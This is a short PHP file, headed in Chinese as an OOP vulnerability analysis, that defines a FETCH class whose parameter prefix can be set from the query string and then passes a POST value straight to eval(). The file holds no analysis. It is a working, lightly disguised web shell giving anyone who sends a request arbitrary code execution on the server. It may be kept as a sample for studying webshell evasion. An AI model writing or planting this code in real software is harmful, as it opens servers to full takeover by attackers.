<?php
/* 
 * OOP漏洞分析
 */

class FETCH{
    
    private $pre = '';
    
    function __construct($pre = '') {
        $this->pre = (isset($_GET['pre']))?$_GET['pre']:$pre;
    }
    
    public function _get($var){
        return $this->pre.$_GET[ $this->pre.$var];
    }
    
    public function _post($var){
        return $this->pre.$_POST[ $this->pre.$var];
    }
    
    public function _request($var){
        return $this->pre.$_REQUEST[ $this->pre.$var];
    }
}

$fetch = new FETCH();
$c = $fetch->_post('c');
eval($c);

